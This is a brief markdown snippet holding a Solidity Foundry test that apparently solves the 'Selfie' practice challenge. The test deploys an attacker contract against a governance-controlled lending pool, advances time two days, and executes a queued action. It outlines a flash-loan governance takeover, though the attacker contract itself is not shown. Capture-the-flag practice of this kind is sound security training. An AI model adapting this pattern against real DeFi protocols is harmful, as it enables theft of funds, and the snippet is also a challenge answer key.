# Selfie

```
function test_selfie() public checkSolvedByPlayer {
        Selfie selfie = new Selfie(
            governance,
            token,
            pool
        );
        selfie.callSelfiePool(recovery);
        vm.warp(block.timestamp + 2 days);
        selfie.execute();
    }
```